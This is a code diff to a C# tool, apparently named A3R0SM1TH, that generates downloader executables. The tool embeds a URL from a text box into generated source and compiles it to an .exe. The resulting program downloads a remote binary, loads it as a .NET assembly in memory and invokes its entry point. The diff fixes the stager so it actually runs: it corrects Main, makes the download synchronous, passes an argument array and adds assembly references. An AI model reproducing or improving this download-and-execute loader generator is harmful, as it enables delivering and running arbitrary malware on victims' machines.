@@ -40,8 +40,10 @@ namespace A3R0SM1TH
 			String url = fileLinkBox.Text;
 			String text = @"using System;
 			using System.Collections.Generic;
+			using System.IO;
 			using System.Linq;
 			using System.Net;
+			using System.Net.Http;
 			using System.Reflection;
 			using System.Text;
 			using System.Threading.Tasks;
@@ -50,26 +52,26 @@ namespace A3R0SM1TH
 			{
 				class Program
 				{
-					static void main(String[] args)
+					static void Main(String[] args)
 					{
-						WebClient webClient = new WebClient();
-						webClient.DownloadDataCompleted += new DownloadDataCompletedEventHandler(webClient_DownloadDataCompleted);
-						webClient.DownloadDataAsync(new Uri(" + url + @"));
-					}
+						WebClient client = new WebClient();
+						MemoryStream memStream = new MemoryStream(client.DownloadData(" + url + @"));
+						byte[] bin = memStream.ToArray();
+						String hex = BitConverter.ToString(bin);
+						memStream.Close();
 
-					static void webClient_DownloadDataCompleted(object sender, DownloadDataCompletedEventArgs e)
-					{
-						Byte[] downloadedData = e.Result;
-						Assembly a = Assembly.Load(downloadedData);
+						Assembly a = Assembly.Load(bin);
 						MethodInfo method = a.EntryPoint;
 						if (method != null)
 						{
+							string[] meme = new string[] { null };
 							object o = a.CreateInstance(method.Name);
-							method.Invoke(o, null);
+							method.Invoke(o, meme);
 						}
 					}
 				}
-			}";
+			}
+			";
 			saveDownloader.Filter = "exe files (*.exe)|.exe";
 			saveDownloader.Title = "Save the .exe File";
 			saveDownloader.ShowDialog();
@@ -80,6 +82,10 @@ namespace A3R0SM1TH
 			ICodeCompiler icc = codeProvider.CreateCompiler();
 
 			System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
+			parameters.ReferencedAssemblies.Add("System.Net.dll");
+			parameters.ReferencedAssemblies.Add("System.Linq.dll");
+			parameters.ReferencedAssemblies.Add("System.Net.Http.dll");
+
 			//Make sure we generate an EXE, not a DLL
 			parameters.GenerateExecutable = true;
 			parameters.OutputAssembly = fileDownName;
